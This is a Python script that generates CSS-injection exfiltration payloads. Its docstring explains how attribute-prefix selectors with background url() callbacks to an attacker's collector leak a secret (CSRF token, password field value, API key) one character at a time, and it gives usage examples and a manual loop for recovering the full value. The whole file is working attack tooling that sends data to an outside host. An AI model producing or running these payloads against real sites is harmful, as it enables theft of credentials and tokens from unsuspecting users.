#!/usr/bin/env python3
"""
css_exfil.py — generate CSS-injection payloads that leak a value character by
character to your collector. (This is the technique that beat you last time —
the missing piece was a listener + the right payloads. collector.py + this.)

How CSS injection exfil works
-----------------------------
If you can inject CSS into a page that contains a secret in an attribute (a CSRF
token, a password field's value, an API key in a data-* attribute), you use
attribute selectors that fire a network request only when a prefix matches:

    input[name="secret"][value^="a"] { background: url(http://you/leak?c=a&i=0); }

The browser requests the URL only if the value starts with "a". Send one rule per
possible character; whichever one calls home reveals the next character. Repeat,
extending the known prefix, until you have the whole value.

Usage
-----
  # Leak the value of <input name="secret"> to your collector, 1st char:
  python3 css_exfil.py --host http://YOUR_IP:8000 --name secret

  # You already know it starts with "flag{" — leak the NEXT char:
  python3 css_exfil.py --host http://YOUR_IP:8000 --name secret --known 'flag{'

  # Leak a data attribute instead of value:
  python3 css_exfil.py --host http://YOUR_IP:8000 --selector 'div#token' --attr data-token

Notes
-----
* value^= matches a PREFIX. Inject the batch, read collector, append the found
  char to --known, re-run. (Automate the loop once you confirm it works.)
* Some setups need the recursive @font-face / ligature trick to leak without
  re-injecting per char, or when you only get ONE injection. See references.
* Run collector.py with --css to auto-reassemble the leaked string.
"""
import argparse, string

def build(host, selector, attr, known, charset):
    host = host.rstrip("/")
    idx = len(known)
    rules = []
    # match the known prefix + each candidate next char
    for ch in charset:
        prefix = (known + ch)
        # escape quotes/backslashes minimally for the CSS string
        esc = prefix.replace("\\", "\\\\").replace('"', '\\"')
        # url-safe-ish char in the callback
        safe = ch if ch not in ' &#?"\\' else "%%%02x" % ord(ch)
        rule = (f'{selector}[{attr}^="{esc}"]'
                f'{{background:url({host}/leak?i={idx}&c={safe})}}')
        rules.append(rule)
    return rules

def main():
    ap = argparse.ArgumentParser(description="CSS injection exfil payload generator")
    ap.add_argument("--host", required=True, help="your collector base URL, e.g. http://1.2.3.4:8000")
    ap.add_argument("--name", help="shorthand: target <input name=NAME> value")
    ap.add_argument("--selector", help="full CSS selector, e.g. div#token (overrides --name)")
    ap.add_argument("--attr", default="value", help="attribute to leak (default: value)")
    ap.add_argument("--known", default="", help="prefix already recovered")
    ap.add_argument("--charset", default="default",
                    help="'default' (printable-ish), 'flag' (a-z0-9_{}-), or a literal set")
    ap.add_argument("--oneline", action="store_true", help="emit as a single line")
    a = ap.parse_args()

    if a.selector:
        selector = a.selector
    elif a.name:
        selector = f'input[name="{a.name}"]'
    else:
        ap.error("need --name or --selector")

    if a.charset == "default":
        charset = string.ascii_letters + string.digits + "_-{}!.@$"
    elif a.charset == "flag":
        charset = string.ascii_lowercase + string.ascii_uppercase + string.digits + "_{}-"
    else:
        charset = a.charset

    rules = build(a.host, selector, a.attr, a.known, charset)
    sep = "" if a.oneline else "\n"
    print(sep.join(rules))
    print(f"\n/* {len(rules)} rules. Known prefix: {a.known!r}. "
          f"Inject these, watch collector.py --css, then append the found char to --known and repeat. */",
          flush=True)

if __name__ == "__main__":
    main()
